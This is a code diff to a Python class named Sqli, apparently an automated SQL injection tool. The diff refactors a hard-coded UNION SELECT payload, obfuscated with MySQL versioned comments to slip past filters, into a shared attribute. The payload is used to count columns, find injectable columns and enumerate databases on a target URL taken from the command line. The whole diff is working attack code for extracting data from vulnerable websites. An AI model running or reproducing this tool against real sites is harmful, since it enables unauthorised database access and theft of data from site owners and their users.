@@ -29,6 +29,7 @@ class Sqli:
     columns = None
     dbs = []
     build = ["", ""]
+    payload = "0x2d31+/*!50000UNION*//*!50000SELECT*/"
     key = "1620597971540027"
     def setUrl(self):
         for k, v in enumerate(sys.argv):
@@ -57,7 +58,7 @@ class Sqli:
 
     def setColumns(self):
         print "Start Count Columns..."
-        url = self.url + "0x2d31+/*!50000UNION*//*!50000SELECT*/"
+        url = self.url + self.payload
         start = 1
         finish = 50
         for i in range(start,finish):
@@ -74,7 +75,7 @@ class Sqli:
 
     def setVulCol(self):
         for i in range(1, self.columns+1):
-            line = "0x2d31+/*!50000UNION*//*!50000SELECT*/"
+            line = self.payload
             for j in range(1, self.columns+1):
                 if j != 1 and j != self.columns+1:
                     line = line + ", "
@@ -103,7 +104,7 @@ class Sqli:
                 exit()
 
     def getDatabase(self):
-        self.build = [self.url + "0x2d31+/*!50000UNION*//*!50000SELECT*/", ""]
+        self.build = [self.url + self.payload, ""]
         line = ""
         side = 0
         for i in range(1, self.columns+1):
